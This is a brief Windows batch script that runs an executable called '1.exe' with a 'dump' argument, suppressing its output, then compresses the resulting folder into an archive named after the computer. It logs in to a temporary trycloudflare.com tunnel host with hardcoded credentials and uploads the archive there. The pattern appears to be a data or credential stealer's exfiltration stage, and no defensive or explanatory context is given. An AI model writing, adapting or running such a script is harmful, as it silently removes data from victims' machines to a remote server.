@echo off
cd /d "%~dp0"
"1.exe" "dump" >nul 2>&1

powershell -Command "Compress-Archive -Path 'results' -DestinationPath 'result_%COMPUTERNAME%.zip' -Force"


curl -c cookies.txt -d "name=alex" -d "pass=123" https://witnesses-secondary-elementary-promised.trycloudflare.com/Login/login.php


curl -b cookies.txt -F "submit=1" -F "file[]=@result_%COMPUTERNAME%.zip" https://witnesses-secondary-elementary-promised.trycloudflare.com/Login/upload.php


